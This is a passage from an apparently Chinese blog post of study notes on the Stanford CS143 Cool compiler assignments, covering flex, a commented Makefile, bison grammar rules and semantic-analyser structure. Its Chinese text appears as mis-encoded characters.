¹æ®flexçš„è¯­æ³•è¿”å›tokenå°±å®Œäº‹äº†, ä½†è¦çŸ¥é“çš„æ˜¯flexçš„å†…éƒ¨åŸç†ä»ç„¶æ˜¯æœ‰ç©·è‡ªåŠ¨æœºfinite automate, å…·ä½“æ¦‚å¿µå¯ä»¥çœ‹çœ‹è¯¾ç¨‹PDF, flexçš„ä»£ç åˆ†æå¯è§ <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/flex_analysis.md">è¿™é‡Œ</a>, è‚–å“¥çš„åˆ†æåœ¨ <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week3-6#1-lexer---%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90">è¿™é‡Œ</a> </li><li>å­—ç¬¦ä¸²ç”¨åˆ°äº†stringtable. å…·ä½“è§coolæ–‡æ¡£: We provide you with a string table implementation, which is discussed in detail in A Tour of the Cool<br>Support Code and in documentation in the code. For the moment, you only need to know that the type of string table entries is Symbol.</li></ul><p>flex <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html">document</a> </p><ul><li><code>yylex()</code>æ˜¯<a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC10">æ‰«æä¾‹ç¨‹</a>. </li><li>Actionsä¸­<code>yyless()</code> and <code>yymore()</code>å¯ä»¥æŠŠyytextçš„å­—ç¬¦æ”¾åˆ°æˆ–è€…å–å‡ºè‡ªinput streamä¸­. </li><li><code>#define yylval cool_yylval</code>: è¿”å›semantic value.</li><li><a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC10:~:text=Start%20conditions%20are%20declared%20in%20the%20definitions%20(first)%20section">Start conditions</a>: è¿™ä¸ªå°±æ˜¯åŒ¹é…æˆå¯¹æ³¨é‡Šç¬¦çš„æ¡ä»¶. <code>&lt;QUOTE_COMMENT&gt;&quot;*)&quot;         &#123; ... &#125;</code> <ul><li><code>%x QUOTE_COMMENT</code>: <em>exclusive</em>å£°æ˜.  If it is <em>exclusive</em>, then <em>only</em> rules qualified with the start condition will be active. </li><li><code>BEGIN(INITIAL);</code>: `BEGIN(0/INITIAL)â€™ returns to the original state where only the rules with no start conditions are active. </li></ul></li></ul><p>æ–‡ä»¶:</p><ul><li>lexertest.ccæ˜¯mainå‡½æ•°æ‰€åœ¨æ–‡ä»¶, æˆ‘ä»¬å†™å®Œcool.flexåflexä½¿ç”¨æ­¤æ–‡ä»¶å’Œä¼—å¤šä¾èµ–æ–‡ä»¶ç¼–è¯‘æˆlexer(executable)<ul><li>å¼€å¤´ä¸€ä¸ªhandle_flagså‡½æ•°å¤„ç†å‘½ä»¤è¡Œå‚æ•°. å…·ä½“è§æ–‡ä»¶. </li><li>è°ƒç”¨cool_yylexæ¥æ¯æ¬¡å¾—åˆ°ä¸€ä¸ªtoken, ç„¶ådumpæ‰“å°å‡ºæ¥. </li></ul></li><li>cool-lex.ccå³ä¸ºflexè‡ªåŠ¨ç”Ÿæˆçš„è¯æ³•æ‰«æè‡ªåŠ¨æœº</li><li>includeä¸­çš„cool-parser.hæ˜¯ä¸€äº›å®å®šä¹‰, æ¯”å¦‚token type.</li></ul><h2 id="2-parser-è¯­æ³•åˆ†æ"><a href="#2-parser-è¯­æ³•åˆ†æ" class="headerlink" title="2.parser - è¯­æ³•åˆ†æ"></a>2.parser - è¯­æ³•åˆ†æ</h2><ul><li>æ­¤é˜¶æ®µä¸»è¦ä»»åŠ¡æ˜¯æ„å»ºASTæ ‘</li><li>æ–‡ä»¶å…³ç³»:<ul><li>parser-phase.ccæ˜¯mainå‡½æ•°æ‰€åœ¨æ–‡ä»¶, è°ƒç”¨cool_yyparseå‡½æ•°</li><li>æŠŠè¯æ³•åˆ†æç¼–è¯‘å‡ºçš„lexeræ–‡ä»¶æ”¾è¿›æ­¤PAçš„æ–‡ä»¶å¤¹ä¸­å®Œæˆè¯æ³•åˆ†æ</li><li>cool.yä¸ºæˆ‘ä»¬è¦ç¼–å†™çš„bisonæ–‡ä»¶, cool-parse.ccä¸ºbisonè‡ªåŠ¨ç”Ÿæˆçš„æºæ–‡ä»¶, parserä¸ºå¯æ‰§è¡Œæ–‡ä»¶</li><li><code>assignments/PA3/cool-tree.handcode.h</code>: è¿™ä¸ªçœŸæ˜¯æ‰‹å†™çš„, å®šä¹‰äº†æ¯ä¸ªclassä¸­extraçš„éƒ¨åˆ†, ä½¿ç”¨å®æ¥æ”¯æŒè‡ªå®šä¹‰, åœ¨ä¹‹åçš„assignmentä¸­ä¼šåŠ å…¥æ›´å¤šçš„ä¸œè¥¿. </li></ul></li><li>If no parent is specified, the class inherits from the Object class. </li></ul><h3 id="makeç›¸å…³"><a href="#makeç›¸å…³" class="headerlink" title="makeç›¸å…³"></a>makeç›¸å…³</h3><ul><li>è¿™makeæ–‡ä»¶ä¸­è¿˜å‡ºç°äº†<code>ln -s</code>å‘½ä»¤, å±…ç„¶åªæ˜¯ç”¨æ¥å°†srcæˆ–è€…includeæ–‡ä»¶å¤¹ä¸­çš„æºæ–‡ä»¶å¤åˆ¶åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹, çœŸçš„æ˜¯æœ‰ç‚¹æ„ä¹‰ä¸æ˜. </li><li><code>.d</code><a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Prerequisites.html">æ–‡ä»¶doc</a> : ä¸ºäº†ä¸ç”¨æ‰‹åŠ¨æ›´æ”¹ä¸€ä¸ª.ccæ–‡ä»¶çš„header file prerequisites, å¯ä»¥å…ˆé€šè¿‡ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆè¯¥æ–‡ä»¶çš„ä¾èµ–, æŠŠ.dæ–‡ä»¶åä¹Ÿæ”¾åˆ°targetéƒ¨åˆ†, è¾“å‡ºåˆ°.dæ–‡ä»¶ä¸­, å†ä½¿ç”¨<code>-include</code>åŠ å…¥åˆ°makefileä¸­. </li><li><code>-include filenamesâ€¦</code>: This acts like <code>include</code> in every way except that there is no error (not even a warning) if any of the filenames (or any prerequisites of any of the filenames) do not exist or cannot be remade.</li><li></li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">ASSN = 3<br>CLASS= cs143<br>CLASSDIR= ../..<br>LIB= -lfl <span class="hljs-comment">#æ„ä¹‰ä¸æ˜çš„flag</span><br>AR= gar<br>ARCHIVE_NEW= -cr<br>RANLIB= gar -qs<br><br>SRC= cool.y cool-tree.handcode.h good.cl bad.cl README<br>CSRC= parser-phase.cc utilities.cc stringtab.cc dumptype.cc \<br>      tree.cc cool-tree.cc tokens-lex.cc  handle_flags.cc <br>TSRC= myparser mycoolc cool-tree.aps <span class="hljs-comment">#è¿™ä¸ªapså®Œå…¨éƒ½æ²¡æœ‰ç”¨åˆ°å•Š. ç¡®å®ç”¨ä¸åˆ°</span><br>CGEN= cool-parse.cc<br>HGEN= cool-parse.h<br>LIBS= lexer semant cgen<br>CFIL= $&#123;CSRC&#125; $&#123;CGEN&#125;<br>HFIL= cool-tree.h cool-tree.handcode.h <br>LSRC= Makefile<br>OBJS= $&#123;CFIL:.cc=.o&#125; <span class="hljs-comment">#makeçš„å­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°</span><br>OUTPUT= good.output bad.output<br><br><br>CPPINCLUDE= -I. -I$&#123;CLASSDIR&#125;/<span class="hljs-keyword">include</span>/PA$&#123;ASSN&#125; -I$&#123;CLASSDIR&#125;/src/PA$&#123;ASSN&#125;<br><br>BFLAGS = -d -v -y -b cool --debug -p cool_yy<br><br>CC=g++<br>CFLAGS=-g -Wall -Wno-unused -Wno-deprecated  -Wno-write-strings -DDEBUG $&#123;CPPINCLUDE&#125;<br>FLEX=flex $&#123;FFLAGS&#125;<br>BISON= bison $&#123;BFLAGS&#125;<br>DEPEND = $&#123;CC&#125; -MM $&#123;CPPINCLUDE&#125;<br><br><span class="hljs-section">source: $&#123;SRC&#125; $&#123;TSRC&#125; $&#123;LIBS&#125; lsource</span><br><span class="hljs-section">lsource: $&#123;LSRC&#125;</span><br><span class="hljs-section">$&#123;OUTPUT&#125;:parser good.cl bad.cl</span><br>@rm -f $&#123;OUTPUT&#125;<br>./myparser good.cl &gt;good.output 2&gt;&amp;1 <br>-./myparser bad.cl &gt;bad.output 2&gt;&amp;1 <br><span class="hljs-section">parser: $&#123;OBJS&#125;</span><br>$&#123;CC&#125; $&#123;CFLAGS&#125; $&#123;OBJS&#125; $&#123;LIB&#125; -o parser<br><span class="hljs-section">.cc.o:</span><br>$&#123;CC&#125; $&#123;CFLAGS&#125; -c <span class="hljs-variable">$&lt;</span><br><span class="hljs-comment">#ä½¿ç”¨bisonçš„è¯æ®. ä½†æ˜¯é‡å‘½åäº†ä¸€ä¸‹, å½“å‰æ–‡ä»¶å¤¹ä¸­è¿˜æœ‰ä¸€ä¸ªcool.tab.hå¤´æ–‡ä»¶.</span><br>cool-parse.cc cool-parse.h: cool.y<br>bison $&#123;BFLAGS&#125; cool.y<br>mv -f cool.tab.c cool-parse.cc<br><span class="hljs-comment">#myparserä¸­ä½¿ç”¨äº†lexer, è¦å…ˆæ¥ä¸€ä¸ª</span><br><span class="hljs-section">dotest:parser good.cl bad.cl</span><br>@echo <span class="hljs-string">&quot;\nRunning parser on good.cl\n&quot;</span><br>-./myparser good.cl <br>@echo <span class="hljs-string">&quot;\nRunning parser on bad.cl\n&quot;</span><br>-./myparser bad.cl<br><br><span class="hljs-section">$&#123;LIBS&#125;:</span><br>$&#123;CLASSDIR&#125;/etc/link-object $&#123;ASSN&#125; <span class="hljs-variable">$@</span><br><span class="hljs-comment">#ç¥å¥‡çš„ç¬¦å·é“¾æ¥, æŠŠè¿™äº›æºæ–‡ä»¶éƒ½é“¾æ¥åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹, ä¸çŸ¥é“æœ‰ä»€ä¹ˆä½œç”¨. </span><br>$&#123;TSRC&#125; $&#123;CSRC&#125;:<br>-ln -s $&#123;CLASSDIR&#125;/src/PA$&#123;ASSN&#125;/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span><br><span class="hljs-section">$&#123;HSRC&#125;:</span><br>-ln -s $&#123;CLASSDIR&#125;/<span class="hljs-keyword">include</span>/PA$&#123;ASSN&#125;/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span><br><br>clean :<br>-rm -f $&#123;OUTPUT&#125; *.s core $&#123;OBJS&#125; $&#123;CGEN&#125; $&#123;HGEN&#125; lexer parser cgen semant *~ *.a *.o <br><br><span class="hljs-section">clean-compile:</span><br>@-rm -f core $&#123;OBJS&#125; $&#123;CGEN&#125; $&#123;HGEN&#125; $&#123;LSRC&#125;<br><br><span class="hljs-section">%.d: %.cc $&#123;LSRC&#125;</span><br>$&#123;SHELL&#125; -ec &#x27;$&#123;DEPEND&#125; <span class="hljs-variable">$&lt;</span> | sed &#x27;\&#x27;&#x27;s/\(<span class="hljs-variable">$*</span>\.o\)[ :]*/\1 <span class="hljs-variable">$@</span> : /g&#x27;\&#x27;&#x27; &gt; <span class="hljs-variable">$@</span>&#x27;<br><br><span class="hljs-keyword">-include</span> $&#123;CFIL:.cc=.d&#125;<br></code></pre></div></td></tr></table></figure><h3 id="bison"><a href="#bison" class="headerlink" title="bison:"></a>bison:</h3><ul><li><p><a href="https://web.archive.org/web/20210621041953/https://happyers.top/compiler/bison-parser/">ç”Ÿæˆä»£ç åˆ†æ</a> | <a href="https://www.cs.uic.edu/~spopuri/cparser.html">è‹±æ–‡</a> | <a href="https://www.gnu.org/software/bison/manual/bison.html">æ–‡æ¡£</a> </p></li><li><p><code>bison</code>æ‰€ä½¿ç”¨çš„æ˜¯è‡ªåº•å‘ä¸Šï¼Œå·¦é€’å½’çš„åˆ†ææ–¹å¼ã€‚</p></li><li><p>åœ¨è¯­æ³•åˆ†æè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥è¿‡æ»¤å‡ºä¸€äº›ä¸ç¬¦åˆè¯­æ³•çš„é”™è¯¯ï¼Œä¾‹å¦‚tokenæ’åˆ—ä¸ç¬¦åˆæ¡ä»¶ï¼Œæ— æ³•è§„çº¦ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹å¿…é¡»è¿›è¡Œé”™è¯¯å¤„ç†ç¨‹åºï¼Œå°†tokenå¼¹å‡ºæ ˆï¼ˆæˆ–è€…å…¶ä»–æ“ä½œï¼‰ã€‚</p></li><li><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">%<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>...<br>    Class_ class_;<br>&#125;<br><br>%type &lt;class_&gt; <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">/* <span class="hljs-title">If</span> <span class="hljs-title">no</span> <span class="hljs-title">parent</span> <span class="hljs-title">is</span> <span class="hljs-title">specified</span>, <span class="hljs-title">the</span> <span class="hljs-keyword">class</span> <span class="hljs-title">inherits</span> <span class="hljs-title">from</span> <span class="hljs-title">the</span> <span class="hljs-title">Object</span> <span class="hljs-title">class</span>. */</span><br><span class="hljs-class">/* å®šä¹‰ï¼šä»¥ä¸‹<span class="hljs-title">token</span>è§„çº¦åçš„ç¬¦å·åç§°ä¸º&quot;<span class="hljs-keyword">class</span>&quot; */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> :</span><br>  <span class="hljs-comment">/* è‹¥å½“å‰æ ˆä¸­çš„tokenæ»¡è¶³ä¸‹é¢è¿™æ¡å¼å­ */</span><br>  CLASS TYPEID <span class="hljs-string">&#x27;&#123;&#x27;</span> dummy_feature_list <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-string">&#x27;;&#x27;</span> <span class="hljs-comment">/* &#x27; */</span><br>    <span class="hljs-comment">/* è¿›è¡Œè§„çº¦ã€‚åœ¨è§„çº¦çš„åŒæ—¶æ‰§è¡Œä»¥ä¸‹è¿™æ¡å¼å­ */</span><br>    <span class="hljs-comment">/* æ³¨æ„ï¼Œèµ‹ç»™$$çš„å€¼ï¼Œå°±æ˜¯è§„çº¦åæ–°ç”Ÿæˆ&quot;class&quot;çš„å€¼ */</span><br>    &#123; $$ = <span class="hljs-built_in">class_</span>($<span class="hljs-number">2</span>,idtable.<span class="hljs-built_in">add_string</span>(<span class="hljs-string">&quot;Object&quot;</span>), $<span class="hljs-number">4</span>, stringtable.<span class="hljs-built_in">add_string</span>(curr_filename)); &#125;<br>  | <span class="hljs-comment">/* æˆ–è€…ï¼Œå¦‚æœæ»¡è¶³ä»¥ä¸‹å¼å­ */</span><br>  CLASS TYPEID INHERITS TYPEID <span class="hljs-string">&#x27;&#123;&#x27;</span> dummy_feature_list <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-string">&#x27;;&#x27;</span><br>    &#123; $$ = <span class="hljs-built_in">class_</span>($<span class="hljs-number">2</span>,$<span class="hljs-number">4</span>,$<span class="hljs-number">6</span>,stringtable.<span class="hljs-built_in">add_string</span>(curr_filename)); &#125;<br>  | <span class="hljs-comment">/* æˆ–è€…ï¼Œå¦‚æœæ•è·åˆ°äº†é”™è¯¯ */</span><br>  error <span class="hljs-string">&#x27;;&#x27;</span><br>    &#123;&#125;<br>;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="è¯­æ³•ç‚¹"><a href="#è¯­æ³•ç‚¹" class="headerlink" title="è¯­æ³•ç‚¹"></a>è¯­æ³•ç‚¹</h3><ul><li><p>You must declare bison â€œtypesâ€ for your non-terminals and terminals that have attributes. <code>%type &lt;program&gt; program</code> This declaration says that the non-terminal program has <strong><u>type</u></strong> <code>&lt;program&gt;</code>. The use of the word â€œtypeâ€ is misleading here; what it really means is that the <strong>attribute</strong> for the non-terminal program is stored in the program member of the <strong>union</strong> declaration in cool.y, which has type Program. By specifying the type<br><code>%type &lt;member_name&gt; X Y Z ...</code><br>you instruct bison that the attributes of non-terminals (or terminals) X, Y, and Z have a type appropriate for the member member name of the union.</p></li><li><p>All the union members and their types have similar names by design. It is a coincidence in the example above that the non-terminal program has the same name as a union member.</p></li><li><p>APS: åœ¨cool_tour.pdfé‡Œ</p><ul><li>The Cool abstract syntax is specified in a language called APS</li><li>Phyla are really just <strong>types</strong>. That is, instead of having one large group of undifferentiated constructors, the constructors are grouped together <strong>according to function</strong>, è¿™ä¸ªæ„æ€åº”è¯¥<strong>æ ¹æ®åŠŸèƒ½</strong>. </li><li>the various kinds of abstract syntax tree nodes (let, +, etc.) are called <strong>constructors</strong>.</li><li>Each <strong>constructor</strong> takes <strong>typed</strong> arguments and returns a <strong>typed</strong> result. The types may either be phyla or any ordinary C++ type.</li><li>In fact, the <strong>phyla</strong> declarations are themselves compiled into <strong>C++ class declarations</strong> by an <strong>APS compiler</strong>.</li><li>æˆ‘æ²¡ææ¸…æ¥šapsåœ¨å“ªé‡Œè¢«ç”¨åˆ°äº†, è¿˜æœ‰ä»€ä¹ˆæ˜¯aps compiler. ä¸ä¼šæ˜¯è‡ªåˆ›çš„å§. <strong>æˆ‘å±…ç„¶æ‰¾åˆ°ä¸€ä¸ªaps2c++</strong>. å¯æƒœæ²¡æœ‰ä»€ä¹ˆæ³¨é‡Šå¯çœ‹. </li><li><strong><u><em>é‡å¤§å‘ç°</em></u></strong> : binæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ªaps2c++, å¯ä»¥å°†apsæ–‡ä»¶è½¬åŒ–ä¸º<code>cool-tree.cc</code>å’Œ<code>cool-tree.h</code>æ–‡ä»¶, å…¶ä¸­çš„classæˆå‘˜å‡½æ•°éƒ½æœ‰. åº”è¯¥æ˜¯é»˜è®¤ç”Ÿæˆçš„. æœç„¶æ˜¯è‡ªåˆ›çš„å§. åœ¨åˆå§‹æ–‡ä»¶ä¸­å·²ç»è½¬åŒ–è¿‡äº†, æ‰€ä»¥ä¹Ÿä¸ç”¨å¤ªåœ¨æ„.<ul><li>åœ¨apsæ–‡ä»¶ä¸­å®šä¹‰çš„constructoråœ¨cool.yä¸­è¢«ä½¿ç”¨. The <code>class</code> constructor returns an AST of type (or phylum) <code>Class_</code>.</li><li>åŸºæœ¬åŒä¸Š: cool-tree.hç»“å°¾å¤„å®šä¹‰äº†åœ¨cool.yé‡Œç”¨åˆ°çš„constructor, å®é™…ä¸Šè¿”å›çš„æ˜¯å¯¹åº”çš„classæ„é€ å‡½æ•°. æ¯”å¦‚<code>class__class()</code> <code>method_class()</code>ç­‰ç­‰.</li></ul></li><li>çœŸçš„æ˜¯å¤ªå¤šäº†. å“ªé‡Œçœ‹çš„è¿‡æ¥.</li></ul></li><li><p>a terminal (<code>CLASS</code>), a non-terminal (<code>class</code>), a constructor (<code>class_</code>), and a phylum (<code>Class_</code>). </p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> Class__class *Class_;<br><span class="hljs-function">Class_ <span class="hljs-title">class__class::copy_Class_</span><span class="hljs-params">()</span></span>&#123;   <br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">class__class</span>(<span class="hljs-built_in">copy_Symbol</span>(name), <span class="hljs-built_in">copy_Symbol</span>(parent), features-&gt;<span class="hljs-built_in">copy_list</span>(), <span class="hljs-built_in">copy_Symbol</span>(filename)); &#125;<br></code></pre></div></td></tr></table></figure></li><li><p><strong>åæ­£bisonåªç®¡æ¨å¯¼, è‡³äºåˆ†æå‡ºç»“æœä¹‹åç”¨ä»€ä¹ˆç»“æ„å­˜å‚¨ç®¡ç†å°±æ˜¯æˆ‘ä»¬åœ¨å®šä¹‰çš„éƒ¨åˆ†å’Œå…¶ä»–æ–‡ä»¶é‡Œæ‰€å†™çš„é‚£æ ·</strong>. </p></li><li><p>å¦‚æœè¦çœ‹æ›´å¤šå¯èƒ½è¦åˆ†æbisonçš„è¾“å‡ºæ–‡ä»¶, æš‚æ—¶ä¸çœ‹äº†. æ¥ä¸‹æ¥æ˜¯è¯­ä¹‰åˆ†æ. </p></li></ul><h2 id="3-semantic-è¯­ä¹‰åˆ†æ"><a href="#3-semantic-è¯­ä¹‰åˆ†æ" class="headerlink" title="3.semantic - è¯­ä¹‰åˆ†æ"></a>3.semantic - è¯­ä¹‰åˆ†æ</h2><ol><li>Look at all classes and build an inheritance graph.</li><li>Check that the graph is well-formed.</li><li>For each class<br>(a) Traverse the AST, gathering all visible declarations in a symbol table.<br>(b) Check each expression for type correctness.<br>(c) Annotate the AST with types.</li></ol><ul><li>semant.hç»“æ„å¦‚ä¸‹</li><li>æ³¨æ„åˆ°symboltableä¸­æœ‰ä¸‰ä¸ªtypedef, å…¶ä¸­SymtabEntryé‡Œå­˜å‚¨äº†idå’Œinfo.<br>tblæŒ‡å‘å½“å‰çš„æœ€é‡Œé¢ä¸€å±‚çš„scope, å½“ç„¶ä»–æ˜¯ä¸€ä¸ªlist, å¯ä»¥é€šè¿‡<code>tl()</code>ç»§ç»­æ‰¾åˆ°ä¸Šä¸€å±‚scopeçš„listèŠ‚ç‚¹. </li><li>InheritanceNodeå°±æ˜¯åœ¨class_classçš„åŸºç¡€ä¹‹ä¸Šæ·»åŠ äº†çˆ¶å­ç±»çš„æŒ‡é’ˆ, è¿˜æœ‰reachability basic_status+envè¿™äº›ä¿¡æ¯. å› ä¸ºå¾ˆæ˜æ˜¾éœ€è¦å­˜å‚¨è¯¥ç±»çš„æ‰€æœ‰å­ç±»ä»¥ä¾¿äºç»§æ‰¿æ ‘æ£€æŸ¥. </li><li>è€ŒClassTableä»¥InheritanceNodeçš„å½¢å¼å­˜å‚¨äº†æ‰€æœ‰çš„class, æ–‡ä»¶ä¸­æ‰€æœ‰classæ£€æŸ¥å®Œä¹‹åè¿›å…¥ClassTableçš„æ„é€ å‡½æ•°, è°ƒç”¨private functionsä¾‹å¦‚install_class, build_inheritance_treeç­‰æ¥åˆ†æåˆ¤æ–­ç»§æ‰¿æ ‘çš„åˆæ³•æ€§. </li><li>åˆ›å»ºè¿™ä¸‰ä¸ªclassçš„ç›®çš„ä¹Ÿå¾ˆæ˜æ˜¾, è¯­æ³•åˆ†æå¾—åˆ°çš„æ— è¯­æ³•é”™è¯¯çš„ASTæ ‘èŠ‚ç‚¹ç”±<code>Program_class</code>ä¸€ç±»classç»„æˆ, ä½†æ˜¯èŠ‚ç‚¹èƒ½å¤Ÿå­˜å‚¨çš„ä¿¡æ¯ä¸å¤Ÿç”¨äºç»§æ‰¿æ ‘å’Œç±»å‹æ£€æŸ¥, æ‰€ä»¥åœ¨classçš„åŸºç¡€ä¸Šæ·»åŠ ä¸€äº›ä¿¡æ¯ç»§æ‰¿å‡ºInheritanceNode, å†ç”±ClassTableç®¡ç†, æœ€ç»ˆæ‰€æœ‰çš„method class varéƒ½ç”±ä¸€ä¸ªæœ€å¤§çš„Environment classç®¡ç†. </li></ul><pre><code class=" mermaid">classDiagramclass InheritanceNodeclass ClassTable&#123;   -List&lt;InheritanceNode&gt; *nds   -install_class()   -check_improper_inheritance()   -build_inheritance_tree()   some_other_funcs()&#125;class SymbolTable~Symbol, InheritanceNode~&#123;   typedef SymtabEntry&lt;SYM,DAT&gt; ScopeEntry;   typedef List&lt;ScopeEntry&gt; Scope;   typedef List&lt;Scope&gt; ScopeList;   -ScopeList *tbl;   +enterscope() void   +exitscope() void   +addid() ScopeEntry*   +lookup() DAT*   +probe() DAT*   +dump() void&#125;InheritanceNode &lt;|-- class__class : InheritanceClassTable &lt;|-- SymbolTable~Symbol, InheritanceNode~ : Inheritanceclass Environment&#123;    -SymbolTable~Symbol, method_class~ method_table;    -SymbolTable~Symbol, Entry~  var_table;    -ClassTableP class_table;    -Class_      self_class;    methodè¡¨æ“ä½œå‡½æ•°    variableè¡¨æ“ä½œå‡½æ•°    typeæ“ä½œå‡½æ•°get_self_typeç­‰ç­‰&#125;InheritanceNode : è¯¥classçš„ä¿¡æ¯å’Œenvironmentclass SymtabEntry &#123;  -SYM id;        // the key field  -DAT *info;     // associated information for the symbol  +get_id() SYM  +get_info() DAT *&#125;SymbolTable~Symbol, InheritanceNode~ &lt;|-- SymtabEntry : Inheritance</code></pre><blockquote><p>è¦æˆ‘å†™è¿™äº›ä¸œè¥¿åªèƒ½ä¸€ç‚¹ç‚¹åŠ æˆå‘˜å‡½æ•°å•¥çš„, ç°åœ¨å‹‰å¼ºç†æ¸…æ¥šäº†ç»“æ„æ„Ÿè§‰ä¹Ÿèƒ½ä½“ä¼šåˆ°æ€ä¹ˆæƒ³å‡ºè¿™æ ·çš„ç¨‹åºé€»è¾‘. </p></blockquote><p>å…ˆçœ‹semant-parse.ccå…¥å£mainå‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> Program ast_root;      <span class="hljs-comment">// root of the abstract syntax tree</span><br>FILE *ast_file = stdin;       <span class="hljs-comment">// we read the AST from standard input</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">ast_yyparse</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>; <span class="hljs-comment">// entry point to the AST parser</span><br><span class="hljs-keyword">int</span> cool_yydebug;     <span class="hljs-comment">// not used, but needed to link with handle_flags</span><br><span class="hljs-keyword">char</span> *curr_filename;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_flags</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-built_in">handle_flags</span>(argc,argv);<br>  <span class="hljs-built_in">ast_yyparse</span>();<br>  ast_root-&gt;<span class="hljs-built_in">semant</span>();<br>  ast_root-&gt;<span class="hljs-built_in">dump_with_types</span>(cout,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å…ˆæ˜¯<code>handle_flags()</code>è¿™ä¸çŸ¥é“è¦å¹²å˜›çš„å‡½æ•°, ç„¶åæ˜¯<code>ast_yyparse()</code>æ„é€ å¥½ASTç„¶åå°†æ ¹èŠ‚ç‚¹èµ‹å€¼ç»™<code>ast_root</code>, å†æ‰§è¡Œ<code>program_class</code>çš„<code>semant()</code>å‡½æ•°, <code>dump_with_types()</code>è¾“å‡ºAST(ä¸çŸ¥é“è¦æ€ä¹ˆçœ‹, ç®—äº†ä¹Ÿä¸é‡è¦)</p><p>å†çœ‹<code>semant()</code>å‡½æ•°:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 